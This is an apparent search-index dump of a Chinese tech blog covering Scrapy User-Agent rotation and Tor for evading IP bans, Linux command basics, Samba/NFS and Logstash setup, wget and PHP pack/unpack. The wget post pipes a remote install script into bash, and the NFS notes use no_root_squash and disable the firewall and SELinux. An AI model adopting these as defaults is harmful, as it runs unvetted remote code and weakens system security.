\"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 \"  \n            \"(KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1\",  \n            \"Mozilla/5.0 (X11; Linux x8664) AppleWebKit/536.5 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5\",  \n            \"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5\",  \n            \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\",  \n            \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\",  \n            \"Mozilla/5.0 (Macintosh; Intel Mac OS X 1080) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3\",  \n            \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\",  \n            \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3\",  \n            \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\",  \n            \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\",  \n            \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3\",  \n            \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3\",  \n            \"Mozilla/5.0 (X11; Linux x8664) AppleWebKit/535.24 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\",  \n            \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 \"  \n            \"(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24\"  \n           ]  \n\n建立user agent池（useragentlist）并在每次发送request之前从agent池中随机选取一项设置request的UserAgent。编写的UserAgent中间件的基类为UserAgentMiddle。\n\n除此之外，要在settings.py(配置文件)中禁用默认的useragent并启用重新实现的User Agent。配置方法如下：\n\n[python] view plain copy\n在CODE上查看代码片派生到我的代码片\n\n    #取消默认的useragent,使用新的useragent  \n    DOWNLOADERMIDDLEWARES = {  \n            'scrapy.contrib.downloadermiddleware.useragent.UserAgentMiddleware' : None,  \n            'CSDNBlogCrawlSpider.spiders.rotateuseragent.RotateUserAgentMiddleware' :400  \n        }  \n\n至此配置完毕。现在可以运行看下效果。\n\n可以发现一直在变化的UserAgent。\n\n4.策略四：使用IP池\n\nweb server应对爬虫的策略之一就是直接将你的IP或者是整个IP段都封掉禁止访问，这时候，当IP封掉后，转换到其他的IP继续访问即可。\n\n可以使用Scrapy+Tor+polipo\n\n配置方法与使用教程可参见：http://pkmishra.github.io/blog/2013/03/18/how-to-run-scrapy-with-TOR-and-multiple-browser-agents-part-1-mac/。有时间我会翻译过来。\n\n5.策略五：分布式爬取\n\n这个，内容就更多了，针对scrapy，也有相关的针对分布式爬取的GitHub repo。可以搜一下。\n\n原创，转载请注明：http://blog.csdn.net/u012150179/article/details/35774323","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 systemctl","title":"Linux命令 systemctl","text":"systemctl 命令完全指南\n\t服务管理--systemctl命令 \nsystemctl --version\nSystemd 入门教程：实战篇\nSystemd 入门教程：命令篇","tags":null},{"location":"//blog.pytool.com/cmd/2015-01-01 Linux 常用的20条命令","title":"Linux 常用脚本","text":"玩过Linux的人都会知道，Linux中的命令的确是非常多，但是玩过Linux的人也从来不会因为Linux的命令如此之多而烦恼，因为我们只需要掌握我们最常用的命令就可以了。当然你也可以在使用时去找一下man，他会帮你解决不少的问题。然而每个人玩Linux的目的都不同，所以他们常用的命令也就差异非常大，而我主要是用Linux进行C/C++和shell程序编写的，所以常用到的命令可以就会跟一个管理Linux系统的人有所不同。因为不想在使用是总是东查西找，所以在此总结一下，方便一下以后的查看。不多说，下面就说说我最常用的Linux命令。\n\n1、cd命令\n这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：\n\ncd /root/Docements # 切换到目录/root/Docements  \ncd ./path          # 切换到当前目录下的path目录中，“.”表示当前目录    \ncd ../path         # 切换到上层目录中的path目录中，“..”表示上一层目录  \n2、ls命令\n这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：\n\n-l ：列出长数据串，包含文件的属性与权限数据等  \n-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用）  \n-d ：仅列出目录本身，而不是列出目录的文件数据  \n-h ：将文件容量以较易读的方式（GB，kB等）列出来  \n-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来  \n注：这些参数也可以组合使用，下面举两个例子：\n\nls -l #以长数据串的形式列出当前目录下的数据文件和目录  \nls -lR #以长数据串的形式列出当前目录下的所有文件  \n3、grep命令\n该命令常用于分析一行的信息，若当中有我们所需要的信息，就将该行显示出来，该命令通常与管道命令一起使用，用于对一些命令的输出进行筛选加工等等，它的简单语法为\n\ngrep [-acinv] [--color=auto] '查找字符串' filename  \n它的常用参数如下：\n\n-a ：将binary文件以text文件的方式查找数据  \n-c ：计算找到‘查找字符串’的次数  \n-i ：忽略大小写的区别，即把大小写视为相同  \n-v ：反向选择，即显示出没有‘查找字符串’内容的那一行  \n例如：  \n 取出文件/etc/man.config中包含MANPATH的行，并把找到的关键字加上颜色  \ngrep --color=auto 'MANPATH' /etc/man.config  \n把ls -l的输出中包含字母file（不区分大小写）的内容输出  \nls -l | grep -i file  \n4、find命令\nfind是一个基于查找的功能非常强大的命令，相对而言，它的使用也相对较为复杂，参数也比较多，所以在这里将给把它们分类列出，它的基本语法如下：\n\nfind [PATH] [option] [action]  \n\n 与时间有关的参数：  \n-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件；  \n-mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名；  \n-mtime -n : 列出在n天之内（含n天本身）被更改过的文件名；  \n-newer file : 列出比file还要新的文件名  \n例如：  \nfind /root -mtime 0  在当前目录下查找今天之内有改动的文件  \n\n与用户或用户组名有关的参数：  \n-user name : 列出文件所有者为name的文件  \n-group name : 列出文件所属用户组为name的文件  \n-uid n : 列出文件所有者为用户ID为n的文件  \n-gid n : 列出文件所属用户组为用户组ID为n的文件  \n 例如：  \nfind /home/ljianhui -user ljianhui # 在目录/home/ljianhui中找出所有者为ljianhui的文件  \n\n与文件权限及名称有关的参数：  \n-name filename ：找出文件名为filename的文件  \n-size [+-]SIZE ：找出比SIZE还要大（+）或小（-）的文件  \n-tpye TYPE ：查找文件的类型为TYPE的文件，TYPE的值主要有：一般文件（f)、设备文件（b、c）、  \n             目录（d）、连接文件（l）、socket（s）、FIFO管道文件（p）；  \n-perm mode ：查找文件权限刚好等于mode的文件，mode用数字表示，如0755；  \n-perm -mode ：查找文件权限必须要全部包括mode权限的文件，mode用数字表示  \n-perm +mode ：查找文件权限包含任一mode的权限的文件，mode用数字表示  \n 例如：  \nfind / -name passwd # 查找文件名为passwd的文件  \nfind . -perm 0755 # 查找当前目录中文件权限的0755的文件  \nfind . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte  \n5、cp命令\n该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下，它的常用参数如下：\n\n-a ：将文件的特性一起复制  \n-p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份  \n-i ：若目标文件已经存在时，在覆盖时会先询问操作的进行  \n-r ：递归持续复制，用于目录的复制行为  \n-u ：目标文件与源文件有差异时才会复制  \n例如 ：\n\ncp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2  \ncp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中  \n6、mv命令\n该命令用于移动文件、目录或更名，move之意，它的常用参数如下：\n\n-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖  \n-i ：若目标文件已经存在，就会询问是否覆盖  \n-u ：若目标文件已经存在，且比目标文件新，才会更新  \n注：该命令可以把一个文件或多个文件一次移动一个文件夹中，但是最后一个目标文件一定要是“目录”。\n\n例如：\n\nmv file1 file2 file3 dir # 把文件file1、file2、file3移动到目录dir中  \nmv file1 file2 # 把文件file1重命名为file2  \n7、rm命令\n该命令用于删除文件或目录，remove之间，它的常用参数如下：\n\n-f ：就是force的意思，忽略不存在的文件，不会出现警告消息  \n-i ：互动模式，在删除前会询问用户是否操作  \n-r ：递归删除，最常用于目录删除，它是一个非常危险的参数  \n例如：\n\nrm -i file # 删除文件file，在删除之前会询问是否进行该操作  \nrm -fr dir # 强制删除目录dir中的所有文件  \n8、ps命令\n该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：\n\n-A ：所有的进程均显示出来  \n-a ：不与terminal有关的所有进程  \n-u ：有效用户的相关进程  \n-x ：一般与a参数一起使用，可列出较完整的信息  \n-l ：较长，较详细地将PID的信息列出  \n其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：\n\nps aux # 查看系统所有的进程数据  \nps ax # 查看不与terminal有关的所有进程  \nps -lA # 查看系统所有的进程数据  \nps axjf # 查看连同一部分进程树状态  \n9、kill命令\n该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：\n\nkill -signal PID  \nsignal的常用参数如下：\n注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。\n\n1：SIGHUP，启动被终止的进程  \n2：SIGINT，相当于输入ctrl+c，中断一个程序的进行  \n9：SIGKILL，强制中断一个进程的进行  \n15：SIGTERM，以正常的结束进程方式来终止进程  \n17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行  \n例如：\n\n以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程  \nkill -SIGTERM %1   \n 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得  \nkill -SIGHUP PID  \n10、killall命令\n该命令用于向一个命令启动的进程发送一个信号，它的一般语法如下：\n\nkillall [-iIe] [command name]  \n它的参数如下：\n\n-i ：交互式的意思，若需要删除时，会询问用户  \n-e ：表示后面接的command name要一致，但command name不能超过15个字符  \n-I ：命令名称忽略大小写  \n例如：  \nkillall -SIGHUP syslogd  重新启动syslogd  \n11、file命令\n该命令用于判断接在file命令后的文件的基本数据，因为在Linux下文件的类型并不是以后缀为分的，所以这个命令对我们来说就很有用了，它的用法非常简单，基本语法如下：\n\nfile filename  \n例如：  \nfile ./test  \n12、tar命令\n该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：\n\n-c ：新建打包文件  \n-t ：查看打包文件的内容含有哪些文件名  \n-x ：解打包或解压缩的功能，可以搭配-C（大写）指定解压的目录，注意-c,-t,-x不能同时出现在同一条命令中  \n-j ：通过bzip2的支持进行压缩/解压缩  \n-z ：通过gzip的支持进行压缩/解压缩  \n-v ：在压缩/解压缩过程中，将正在处理的文件名显示出来  \n-f filename ：filename为要处理的文件  \n-C dir ：指定压缩/解压缩的目录dir  \n上面的解说可以已经让你晕过去了，但是通常我们只需要记住下面三条命令即可：\n\n压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称  \n查询：tar -jtv -f filename.tar.bz2  \n解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录  \n注：文件名并不定要以后缀tar.bz2结尾，这里主要是为了说明使用的压缩程序为bzip2\n\n13、cat命令\n该命令用于查看文本文件的内容，后接要查看的文件名，通常可用管道与more和less一起使用，从而可以一页页地查看数据。例如：\n\ncat text | less  查看text文件中的内容  \n注：这条命令也可以使用less text来代替  \n14、chgrp命令\n该命令用于改变文件所属用户组，它的使用非常简单，它的基本用法如下：\n\nchgrp [-R] dirname/filename  \n-R ：进行递归的持续对所有文件和子目录更改  \n 例如：  \nchgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users  \n15、chown命令\n该命令用于改变文件的所有者，与chgrp命令的使用方法相同，只是修改的文件属性不同，不再详述。\n\n16、chmod命令\n该命令用于改变文件的权限，一般的用法如下：\n\nchmod [-R] xyz 文件或目录  \n-R：进行递归的持续更改，即连同子目录下的所有文件都会更改  \n同时，chmod还可以使用u（user）、g（group）、o（other）、a（all）和+（加入）、-（删除）、=（设置）跟rwx搭配来对文件的权限进行更改。\n\n例如：  \nchmod 0755 file  把file的文件权限改变为-rxwr-xr-x  \nchmod g+w file # 向file的文件权限中加入用户组可写权限  \n18、vim命令\n该命令主要用于文本编辑，它接一个或多个文件名作为参数，如果文件存在就打开，如果文件不存在就以该文件名创建一个文件。vim是一个非常好用的文本编辑器，它里面有很多非常好用的命令，在这里不再多说。你可以从这里下载vim常用操作的详细说明。\n\n19、gcc命令\n对于一个用Linux开发C程序的人来说，这个命令就非常重要了，它用于把C语言的源程序文件，编译成可执行程序，由于g++的很多参数跟它非常相似，所以这里只介绍gcc的参数，它的常用参数如下：\n-o ：output之意，用于指定生成一个可执行文件的文件名  \n-c ：用于把源文件生成目标文件（.o)，并阻止编译器创建一个完整的程序  \n-I ：增加编译时搜索头文件的路径  \n-L ：增加编译时搜索静态连接库的路径  \n-S ：把源文件生成汇编代码文件  \n-lm：表示标准库的目录中名为libm.a的函数库  \n-lpthread ：连接NPTL实现的线程库  \n-std= ：用于指定把使用的C语言的版本  \n\n例如：  \n 把源文件test.c按照c99标准编译成可执行程序test  \ngcc -o test test.c -lm -std=c99  \n把源文件test.c转换为相应的汇编程序源文件test.s  \ngcc -S test.c  \n20、time命令\n该命令用于测算一个命令（即程序）的执行时间。它的使用非常简单，就像平时输入命令一样，不过在命令的前面加入一个time即可，例如：\n\ntime ./process  \ntime ps aux  \n在程序或命令运行结束后，在最后输出了三个时间，它们分别是：\nuser：用户CPU时间，命令执行完成花费的用户CPU时间，即命令在用户态中执行时间总和；\nsystem：系统CPU时间，命令执行完成花费的系统CPU时间，即命令在核心态中执行时间总和；\nreal：实际时间，从command命令行开始执行到运行终止的消逝时间；\n\n注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 Samba","title":"Samba","text":"---\nwindows 和linux 之间访问 推荐用samba\n\nsamba nfs 区别\n1.samba 是windows 和linux共享方式 速度块\n2.nfs 在windows下访问慢\n\n如果提示没有权限的问题 chmod o+rwx share\n\n samba\nsamba服务器需要两个守护进程：smbd和nmbd。\nsmbd进程监听TCP139端口，用来管理 SAMBA 主机分享的目录、文件和打印机等，处理到来的SMB数据包;\nnmbd进程监听137、138UDP端口，负责名称解析的服务，使其他主机能浏览linux服务器。\nNBT(NetBIOS over TCP/IP)\n使用137, 138 (UDP) and 139 (TCP）来实现基于TCP/IP的NETBIOS网际互联。\nPort 137 (UDP) - NetBIOS 名字服务  nmbd\nPort 138 (UDP) - NetBIOS 数据报服务 nmbd\nPort 139 (TCP) - 文件和打印共享 ； smbd （基于SMB(Server Message Block)协议，主要在局域网中使用，文件共享协议）\nPort 445 (TCP) - 文件和打印机共享服务 不过该端口是基于CIFS协议（通用因特网文件 系统协议）工作的，而139端口是基于SMB协议（服务器协议族）\nroot@ubuntu-desktop:~# netstat -anptu |grep mb\ntcp        0      0 0.0.0.0:445             0.0.0.0:               LISTEN      3054/smbd       \ntcp        0      0 0.0.0.0:139             0.0.0.0:               LISTEN      3054/smbd       \nudp        0      0 0.0.0.0:137             0.0.0.0:                           3062/nmbd       \nudp        0      0 0.0.0.0:138             0.0.0.0:                           3062/nmbd   \n\napt-get install samba\nmkdir share\n\tchmod o+rw share\n\t!!不能创建在/root/目录下!!\nvi /etc/samba/smb.conf\n[sharename]\ncomment = Shared Folder with username and password\npath = /usr/src\npublic = yes\nwritable = yes\navailable = yes\nbrowseable = yes\ncreate mask = 0755\ndirectory mask = 0755\n;valid users = ubuntu\n;force user = nobody\n;force user = nobody\n;force group = nogroup\n;guest ok = yes\nservice smbd restart\n\n##########\n要mount的机器上面开启NFS\n/etc/init.d/nfs start (service nfs start)\n\n开启mount权限\nvi /etc/exports\n例如：figure/data 192.168.115.*(insecure,rw,sync,noroot_squash,insecure)\n\n开始mount\n[root@localhost /]# mount -t nfs 192.168.115.72:/figure/data /mnt/2\n\n如果mount失败，查看被mount的机器的日志\ncat /var/log/messages |grep mount   查看对应的错误\n\n防火墙 和 selinux关掉。命令关。。\n\nfedora12 nfs mount access denied /etc/exports(2012-07-13 16:28:49)转载▼标签： 杂谈  \n1、NFS包","tags":null},{"location":"//blog.pytool.com/Life/2016-03-01 十二经脉","title":"十二经脉","text":"十二经脉（经络理论）百度百科","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/2016-10-04 ELK","title":"ELK 监控系统","text":"Elasticsearch 权威指南（中文版）(https://es.xiaoleilu.com/)\nELK(ElasticSearch, Logstash, Kibana)搭建实时日志分析平台 (https://my.oschina.net/itblog/blog/547250)\n\nhttps://zhuanlan.zhihu.com/p/26399963\n\nElastic Stack 中文指南 (https://www.gitbook.com/book/chenryn/elk-stack-guide-cn/details)\n\ncreate logstash group\nif ! getent group logstash   /dev/null; then\n  groupadd -r logstash\nfi\n\n create logstash user\nif ! getent passwd logstash   /dev/null; then\n  useradd -r -g logstash -d /usr/share/logstash \\\n    -s /sbin/nologin -c \"logstash\" logstash\nfi\n\nchown -R logstash:logstash /usr/share/logstash\nchown -R logstash /var/log/logstash\nchown logstash:logstash /var/lib/logstash\nsed -i \\\n  -e 's|# path.config:|path.config: /etc/logstash/conf.d|' \\\n  -e 's|# path.logs:|path.logs: /var/log/logstash|' \\\n  -e 's|# path.data:|path.data: /var/lib/logstash|' \\\n  /etc/logstash/logstash.yml\n/usr/share/logstash/bin/system-install /etc/logstash/startup.options\n\nCentOS/RHEL and SuSE\nif [ $1 -eq 0 ]; then\n   Upstart\n  if [ -r \"/etc/init/logstash.conf\" ]; then\n    if [ -f \"/sbin/stop\" ]; then\n      /sbin/stop logstash   /dev/null 2  \u00261 || true\n    else\n      /sbin/service logstash stop   /dev/null 2  \u00261 || true\n    fi\n    if [ -f \"/etc/init/logstash.conf\" ]; then\n      rm /etc/init/logstash.conf\n    fi\n  # SYSV\n  elif [ -r \"/etc/init.d/logstash\" ]; then\n    /sbin/chkconfig --del logstash\n    if [ -f \"/etc/init.d/logstash\" ]; then\n      rm /etc/init.d/logstash\n    fi\n  # systemd\n  else\n    systemctl stop logstash   /dev/null 2  \u00261 || true\n    if [ -f \"/etc/systemd/system/logstash-prestart.sh\" ]; then\n      rm /etc/systemd/system/logstash-prestart.sh\n    fi\n\n    if [ -f \"/etc/systemd/system/logstash.service\" ]; then\n      rm /etc/systemd/system/logstash.service\n    fi\n  fi\n  if getent passwd logstash   /dev/null ; then\n    userdel logstash\n  fi\n\n  if getent group logstash   /dev/null ; then\n    groupdel logstash\n  fi\nfi\n\n`","tags":null},{"location":"//blog.pytool.com/basic/2016-01-07 Shell十三问","title":"shell十三问","text":"Shell 十三问-极客学院Wiki\n\n1. \"\"(双引号) 与''(单引号) 差在哪？\n\nhard quote：''(单引号)，凡在 hard quote 中的所有 meta 均被关闭；\nsoft quote：\"\"(双引号)，凡在 soft quote 中大部分 meta 都会被关闭，但某些会保留 (如 $);\nescape: \\ (反斜杠)，只有在紧接在 escape(跳脱字符) 之后的单一 meta 才被关闭；\n\n$ echo '\"'$SHELL'\"'\n\"/bin/bash\"\n\n$ echo ''\"$SHELL\"''\n/bin/bash\n\n2. 最外面是双引号\" 那么单引号作为普通字符处理 $作为meta字符处理2\n\necho \"'\"$SHELL\"'\"\n'/bin/bash'\necho \"'\"'$SHELL'\"'\"\n'$SHELL'","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 md5sum","title":"md5sum","text":"生成校验文件\nmd5sum target/app.jar   app.jar.md5\n 校验文件\nmd5sum -c app.jar.md5","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 wget","title":"Linux命令 wget","text":"---\nwget http://tel.mirrors.163.com/centos/6.4/isos/x8664/CentOS-6.4-x8664-bin-DVD1.iso     # 下载centos境像\nwget -c http://www.jetbrains.com/webstorm/download/download-thanks.html?platform=linux    # 断点续传下载文件\n\nwget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | bash\nwget -P /home/download http://tel.mirrors.163.com/centos/6.4/isos/x8664/CentOS-6.4-x8664-bin-DVD1.iso    #指定目录下载\nwget -Q 1M http://tel.mirrors.163.com/centos/6.4/isos/x8664/CentOS-6.4-x8664-bin-DVD1.iso    #限定最大下载速度\nwget -r -np -nd http://tel.mirrors.163.com/centos/6.4/os/x8664/   #下载 http://tel.mirrors.163.com/centos/6.4/os/x8664/ 目录中的所有文件\nwget -c -r --level=1 -k -p -np http://docs.Python.org/2/tutorial/index.html   #下载一个网站的本地镜像\n\n下载文件\n-c,  --continue                 断点续传下载文件。\n-x,  --force-directories        强制创建目录。\n-P,  --directory-prefix=PREFIX  指定目录下载\n 常用辅助参数\n-q,  --quiet               安静模式 (无信息输出)。\n\n$ wget -r -np -nd http://example.com/packages/\n\n这条命令可以下载 http://example.com 网站上 packages 目录中的所有文件。其中，-np 的作用是不遍历父目录，-nd 表示不在本机重新创建目录结构。\n\n$ wget -r -np -nd --accept=iso http://example.com/centos-5/i386/\n\n与上一条命令相似，但多加了一个 --accept=iso 选项，这指示 wget 仅下载 i386 目录中所有扩展名为 iso 的文件。你也可以指定多个扩展名，只需用逗号分隔即可。\n\n$ wget -i filename.txt\n\n此命令常用于批量下载的情形，把所有需要下载文件的地址放到 filename.txt 中，然后 wget 就会自动为你下载所有文件了。\n\n$ wget -c http://example.com/really-big-file.iso\n\n这里所指定的 -c 选项的作用为断点续传。\n\n$ wget -m -k (-H) http://www.example.com/\n\n该命令可用来镜像一个网站，wget 将对链接进行转换。如果网站中的图像是放在另外的站点，那么可以使用 -H 选项。","tags":null},{"location":"//blog.pytool.com/Post/基础/2017-04-18 unpack函数","title":"深入pack unpack","text":"---\n\n摘要: PHP作为一门为web而生的服务器端开发语言，被越来越多的公司所采用。其中不乏大公司，如腾迅、盛大、淘米、新浪等。在对性能要求比较高的项目中，PHP也逐渐演变成一门前端语言，用于访问后端接口。或者不同项目之间需要共享数据的时候，通常可以抽取出数据层，通过PHP来访问。\n\nPHP作为一门为web而生的服务器端开发语言，被越来越多的公司所采用。其中不乏大公司，如腾迅、盛大、淘米、新浪等。在对性能要求比较高的项目中，PHP也逐渐演变成一门前端语言，用于访问后端接口。或者不同项目之间需要共享数据的时候，通常可以抽取出数据层，通过PHP来访问。\n写在前面的话\n\n本文介绍的是通过二进制数据包的方式通信，演示语言为PHP和Golang。PHP提供了pack/unpack函数来进行二进制打包和二进制解包。在具体讲解之前，我们先来了解一些基础知识。\n什么是字节序\n\n在不同的计算机体系结构中，对于数据(比特、字节、字)等的存储和传输机制有所不同，因而引发了计算机领域中一个潜在但是又很重要的问题，即通信双方交流的信息单元应该以什么样的顺序进行传送。如果达不成一致的规则，计算机的通信与存储将会无法进行。目前在各种体系的计算机中通常采用的字节存储机制主要有两种：大端(Big-endian)和小端(Little-endian)。这里所说的大端和小端即是字节序。\nMSB和LSB\n\n   MSB是Most Significant Bit/Byte的首字母缩写，通常译为最重要的位或最重要的字节。它通常用来表示在一个bit序列(如一个byte是8个bit组成的一个序列)或一个byte序列(如word是两个byte组成的一个序列)中对整个序列取值影响最大的那个bit/byte。\n\n   LSB是Least Significant Bit/Byte的首字母缩写，通常译为最不重要的位或最不重要的字节。它通常用来表明在一个bit序列(如一个byte是8个bit组成的一个序列)或一个byte序列(如word是两个byte组成的一个序列)中对整个序列取值影响最小的那个bit/byte。\n\n   对于一个十六进制int类型整数0x12345678来说，0x12就是MSB，0x78就是LSB。而对于0x78这个字节而言，它的二进制是01111000，那么最左边的那个0就是MSB，最右边的那个0就是LSB。\n\n大端序\n\n   大端序又叫网络字节序。大端序规定高位字节在存储时放在低地址上，在传输时高位字节放在流的开始；低位字节在存储时放在高地址上，在传输时低位字节放在流的末尾。\n\n小端序\n\n   小端序规定高位字节在存储时放在高地址上，在传输时高位字节放在流的末尾；低位字节在存储时放在低地址上，在传输时低位字节放在流的开始。\n\n网络字节序\n\n   网络字节序是指大端序。TCP/IP都是采用网络字节序的方式，java也是使用大端序方式存储。\n\n主机字节序\n\n   主机字节序代表本机的字节序。一般是小端序，但也有一些是大端序。\n\n   主机字节序用在协议描述中则是指小端序。\n\n总结\n\n   字节序只针对于多字节类型的数据。比如对于int类型整数0x12345678，它占有4个字节的存储空间，存储方式有大端(0x12, 0x34, 0x56, 0x78)和小端(0x78, 0x56, 0x34, 0x12)两种。可以看到，在大端或小端的存储方式中，是以字节为单位的。所以对于单字节类型的数据，不存在字节序这个说法。\n\npack/unpack详解\n\nPHP pack函数用于将其它进制的数字压缩到位字符串之中。也就是把其它进制数字转化为ASCII码字符串。\n\n格式字符翻译\n\n   a -- 将字符串空白以 NULL 字符填满\n\n   A -- 将字符串空白以 SPACE 字符 (空格) 填满\n\n   h -- 16进制字符串，低位在前以半字节为单位\n\n   H -- 16进制字符串，高位在前以半字节为单位\n\n   c -- 有符号字符\n\n   C -- 无符号字符\n\n   s -- 有符号短整数 (16位，主机字节序)\n\n   S -- 无符号短整数 (16位，主机字节序)\n\n   n -- 无符号短整数 (16位, 大端字节序)\n\n   v -- 无符号短整数 (16位, 小端字节序)\n\n   i -- 有符号整数 (依赖机器大小及字节序)\n\n   I -- 无符号整数 (依赖机器大小及字节序)\n\n   l -- 有符号长整数 (32位，主机字节序)\n\n   L -- 无符号长整数 (32位，主机字节序)\n\n   N -- 无符号长整数 (32位, 大端字节序)\n\n   V -- 无符号长整数 (32位, 小端字节序)\n\n   f -- 单精度浮点数 (依计算机的范围)\n\n   d -- 双精度浮点数 (依计算机的范围)\n\n   x -- 空字节\n\n   X -- 倒回一位\n\n   @ -- 填入 NULL 字符到绝对位置\n\n格式字符详解\n\n   pack/unpack允许使用修饰符*和数字，紧跟在格式字符之后，用于指定该格式的个数；\n\n   a和A都是用来打包字符串的，它们的唯一区别就是当小于定长时的填充方式。a以NULL填充，NULL事实上是'\\0'的表示，代表空字节，8个位上全是0。A以空格填充，空格也即ASCII码为32的字符。这里有一个关于填充的使用场景的例子：请求登录的数据包规定用户名不超过20个字节，密码经过md5加密后是固定的32个字节。用户名就是变长的，为了便于服务器端读取和处理，通常会填充成定长。当然，这只是使用的方式之一，事实上还可以用变长的方式传递数据包，但这不在本文的探讨范围内。字符串有一点麻烦的是编码问题，尤其是在跟不同的平台通信时更为突出。比如在用pack进行打包字符串时，事实上是将字符内部的编码打包进去。单字节字符就没有问题，因为单字节在所有平台上都是一致的。来看个例子(pack.php)：\n\n\u003c?php\n$bin = pack(\"a\", \"d\");\necho \"output: \" . $bin . \"\\n\";\necho \"output: 0x\" . bin2hex($bin) . \"\\n\";\n\n$ php -f pack.php\noutput: d\noutput: 0x64\n\n$bin是返回的二进制字符，您可以直接输出它，PHP知道如何处理。通过bin2hex方法将$bin转换成十六进制可以知道，十六进制0x64表示的是字符d。对于中文字符(多字节字符)来说，通常有GBK编码、BIG5编码以及UTF8编码等。比如在GBK编码中，一个中文字符采用2个字节来表示；在UTF8编码中，一个中文字符采用3个字节来表示。这通常需要协商采用统一的编码，否则会由于内部的表示不一致导致无法处理。在PHP中只要将文件保存为特定的编码格即可，其它语言可能跟操作系统相关，因此或许需要编码转换。本文的例子一概基于UTF8编码。继续来看个例子：\n\n\u003c?php\n$bin = pack(\"a3\", \"中\");\necho \"output: 0x\" . bin2hex($bin) . \"\\n\";\necho \"output: \" . chr(0xe4) . chr(0xb8) . chr(0xad) . \"\\n\";\necho \"output: \" . $bin{0} . $bin{1} . $bin{2} . \"\\n\";\n\n$ php -f pack.php\noutput: 0xe4b8ad\noutput: 中\noutput: 中\n\n您可能会觉得很奇怪，后面2个输出是一样的。ASCII码表示单字节字符(其中包括英文字母、数字、英文标点符号、不可见字符以及控制字符等等)，它总是小于0x80，即小于十进制的128。当在处理字符时，如果字节小于0x80，则把它当作单字节来处理，否则会继续读取下一个字节，这通常跟编码有关，GBK会将2个字节当成一个字符来处理，UTF8则需要3个字节。有时候在PHP中需要做类似的处理，比如计算字符串中字符的个数(字符串可能包含单字节和多字节)，strlen方法只能计算字节数，而mb_strlen需要开启扩展。类似这样的需求，其实很容易处理：\n\n\u003c?php\nfunction mbstrlen($str)\n{\n $len = strlen($str);\n\n if ($len \u003c= 0)\n {\n   return 0;\n }\n\n $count  = 0;\n\n for ($i = 0; $i \u003c $len; $i++)\n {\n   $count++;\n   if (ord($str{$i})   = 0x80)\n   {\n     $i += 2;\n   }\n }\n\n return $count;\n}\n\necho \"output: \" . mbstrlen(\"中国so强大！\") . \"\\n\";\n\n$ php -f pack.php\noutput: 